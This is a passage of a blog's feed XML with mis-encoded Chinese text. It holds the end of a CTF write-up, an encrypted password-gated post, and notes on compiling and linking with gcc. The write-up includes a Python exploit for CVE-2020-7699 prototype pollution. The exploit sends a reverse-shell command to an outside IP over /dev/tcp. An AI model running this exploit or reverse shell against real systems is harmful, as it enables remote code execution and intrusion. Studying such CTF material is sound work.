class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">main                                # å…¨å±€é…ç½®</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginxå·¥ä½œæ¨¡å¼é…ç½®</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # httpè®¾ç½®</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # æœåŠ¡å™¨ä¸»æœºé…ç½®</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # è·¯ç”±é…ç½®</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # è´Ÿè½½å‡è¡¡é…ç½®</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ç›®å½•ç©¿è¶Šæ¼æ´å‚è€ƒ</p><p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p><p>/static../</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p><p>ä¹‹åå°±æ˜¯æ‰¾cveäº†ï¼Œæ¯”è¾ƒèœï¼Œåªèƒ½å­¦ä¹ </p><p>cve-2020-7699</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure><p>ä¹‹ååå¼¹shellï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Hitcon2017-babyfirst-reveng&quot;&gt;&lt;a href=&quot;#Hitcon2017-babyfirst-reveng&quot; class=&quot;headerlink&quot; title=&quot;Hitcon2017 babyfirst</summary>
      
    
    
    
    <category term="CTF" scheme="https://pz1o.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2020-12-30T16:05:01.181Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»</title>
    <link href="https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    <id>https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</id>
    <published>2021-02-14T08:54:16.000Z</published>
    <updated>2021-02-14T08:56:57.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-ç¼–è¯‘å’Œé“¾æ¥"><a href="#0x01-ç¼–è¯‘å’Œé“¾æ¥" class="headerlink" title="0x01 ç¼–è¯‘å’Œé“¾æ¥"></a>0x01 ç¼–è¯‘å’Œé“¾æ¥</h1><h2 id="1-è¢«éšè—äº†çš„è¿‡ç¨‹"><a href="#1-è¢«éšè—äº†çš„è¿‡ç¨‹" class="headerlink" title="1.è¢«éšè—äº†çš„è¿‡ç¨‹"></a>1.è¢«éšè—äº†çš„è¿‡ç¨‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc a.c</span><br></pre></td></tr></table></figure><blockquote><p>æœ‰å››ä¸ªè¿‡ç¨‹</p><p>é¢„å¤„ç†â€”&gt;ç¼–è¯‘â€”&gt;æ±‡ç¼–â€”&gt;é“¾æ¥</p></blockquote><h3 id="1-1-é¢„ç¼–è¯‘"><a href="#1-1-é¢„ç¼–è¯‘" class="headerlink" title="1.1 é¢„ç¼–è¯‘"></a>1.1 é¢„ç¼–è¯‘</h3><p>é¢„ç¼–è¯‘ä¸»è¦æ¥å¤„ç†é‚£äº›æºä»£ç æ–‡ä»¶ä¸­çš„ä»¥â€#â€å¼€å¤´çš„é¢„ç¼–è¯‘æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -E a.c -o a.i</span><br><span class="line">cpp a.c &gt; a.i</span><br></pre></td></tr></table></figure><h3 id="1-2-ç¼–è¯‘"><a href="#1-2-ç¼–è¯‘" class="headerlink" title="1.2 ç¼–è¯‘"></a>1.2 ç¼–è¯‘</h3><p>ç¼–è¯‘å°±æ˜¯æŠŠé¢„å¤„ç†å®Œçš„æ–‡ä»¶è½¬åŒ–æˆç›¸åº”çš„æ±‡ç¼–ä»£ç æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.i -o a.s</span><br></pre></td></tr></table></figure><blockquote><p>cç¼–è¯‘å™¨ä½¿ç”¨cc1</p><p>c++æ˜¯cc1plus</p></blockquote><h3 id="1-3-æ±‡ç¼–"><a href="#1-3-æ±‡ç¼–" class="headerlink" title="1.3 æ±‡ç¼–"></a>1.3 æ±‡ç¼–</h3><p>æ±‡ç¼–å™¨æ˜¯å°†æ±‡ç¼–ä»£ç è½¬å˜æˆæœºå™¨å¯æ‰§è¡Œçš„æŒ‡ä»¤</p><p>ç®€å•æ¥è¯´å°±æ˜¯ç¿»è¯‘ï¼Œå°†æ±‡ç¼–ä»£ç ä¸æœºå™¨æŒ‡ä»¤ä¸€ä¸€å¯¹ç…§ç¿»è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">as a.s -o a.o</span><br><span class="line">gcc -c a.s -o a.o</span><br></pre></td></tr></table></figure><blockquote><p>æ±‡ç¼–å™¨æ˜¯as</p></blockquote><p>ä»æºæ–‡ä»¶å¼€å§‹ï¼Œé¢„ç¼–è¯‘ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–è¾“å‡ºçš„æ–‡ä»¶å«åšç›®æ ‡æ–‡ä»¶ã€‚</p><h3 id="1-4-é“¾æ¥"><a href="#1-4-é“¾æ¥" class="headerlink" title="1.4 é“¾æ¥"></a>1.4 é“¾æ¥</h3><p>é“¾æ¥å¯ä»¥è¯´æ˜¯æœ€éš¾ä»¥ç†è§£çš„ä¸€ä¸ªè¿‡ç¨‹</p><p>æ¥ä¸‹æ¥ä¼šè¯´</p><h2 id="2-ç¼–è¯‘å™¨åœ¨åšä»€ä¹ˆ"><a href="#2-ç¼–è¯‘å™¨åœ¨åšä»€ä¹ˆ" class="headerlink" title="2.ç¼–è¯‘å™¨åœ¨åšä»€ä¹ˆ"></a>2.ç¼–è¯‘å™¨åœ¨åšä»€ä¹ˆ</h2><p>ä¹Ÿå°±æ˜¯ä¸Šé¢æˆ‘ä»¬è¯´çš„ç¬¬äºŒæ­¥</p><p>å®ƒé€šå¸¸æœ‰6ä¸ªè¿‡ç¨‹</p><ol><li>æ‰«æ</li><li>è¯­æ³•åˆ†æ</li><li>è¯­ä¹‰åˆ†æ</li><li>æºä»£ç ä¼˜åŒ–</li><li>ä»£ç ç”Ÿæˆ</li><li>ç›®æ ‡ä»£ç ä¼˜åŒ–</li></ol><h3 id="2-1-è¯æ³•åˆ†æ"><a href="#2-1-è¯æ³•åˆ†æ" class="headerlink" title="2.1 è¯æ³•åˆ†æ"></a>2.1 è¯æ³•åˆ†æ</h3><p>é¦–å…ˆæºä»£ç ä¼šè¢«è¾“å…¥åˆ°æ‰«æå™¨ä¸­ï¼Œæ‰«æå™¨ç®€å•åœ°è¿›è¡Œè¯æ³•åˆ†æï¼Œè¿ç”¨ä¸€ç§ç±»ä¼¼äº<strong>æœ‰é™çŠ¶æ€æœº</strong>åœ°ç®—æ³•å°†æºä»£ç åœ°å­—ç¬¦åºåˆ—åˆ†å‰²æˆä¸€ç³»åˆ—åœ°è®°å·ã€‚</p><p>è®°å·ä¸€èˆ¬ä¸ºï¼šå…³é”®å­—ã€è¯†åˆ«ç¬¦ã€å­—é¢é‡ï¼ˆæ•°å­—å’Œå­—ç¬¦ä¸²ç­‰ï¼‰å’Œç‰¹æ®Šç¬¦å·ï¼ˆåŠ å·å’Œç­‰å·ï¼‰ã€‚</p><h3 id="2-2-è¯­æ³•åˆ†æ"><a href="#2-2-è¯­æ³•åˆ†æ" class="headerlink" title="2.2 è¯­æ³•åˆ†æ"></a>2.2 è¯­æ³•åˆ†æ</h3><p><strong>è¯­æ³•åˆ†æå™¨</strong>å°†å¯¹ç”±æ‰«æå™¨äº§ç”Ÿçš„è®°å·è¿›è¡Œè¯­æ³•åˆ†æï¼Œ<strong>ä»è€Œäº§ç”Ÿè¯­æ³•æ ‘</strong></p><p>ç®€å•æ¥è¯´ï¼Œè¯­æ³•åˆ†æå™¨äº§ç”Ÿçš„è¯­æ³•æ ‘å°±æ˜¯ä»¥<strong>è¡¨è¾¾å¼</strong>ä¸ºèŠ‚ç‚¹çš„æ ‘</p><p>å…·ä½“å›¾å¯ä»¥çœ‹ä¹¦</p><h3 id="2-3-è¯­ä¹‰åˆ†æ"><a href="#2-3-è¯­ä¹‰åˆ†æ" class="headerlink" title="2.3 è¯­ä¹‰åˆ†æ"></a>2.3 